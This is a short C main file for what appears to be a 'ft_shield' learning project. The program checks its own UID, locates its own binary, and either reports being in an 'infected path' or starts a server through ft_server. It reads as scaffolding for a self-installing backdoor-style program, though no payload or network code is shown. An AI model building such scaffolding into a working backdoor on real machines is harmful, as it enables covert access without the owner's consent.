#include "ft_shield.h"

void	ft_shield()
{
	uid_t	uid = geteuid();

	dprintf(2, "UID: %d\n", uid);
}

int main(int argc, char **argv)
{
	(void)argc,(void)argv;

	char path[255] = {0};

	dprintf(2, "RET: %d\n", find_own_path(path, sizeof(path)));
	if (strcmp(DEST_PATH, dirname(path)) == 0)
	{
		dprintf(2, "We are in the infected path: %s\n", path);
	}
	else
	{
		dprintf(2, "We are safe: %s\n", path);
		t_server server;

		memset(&server, 0, sizeof(t_server));
		printf("sadasd: %d\n", server.fd);
		ft_server(&server);
	}
	return (0);
}
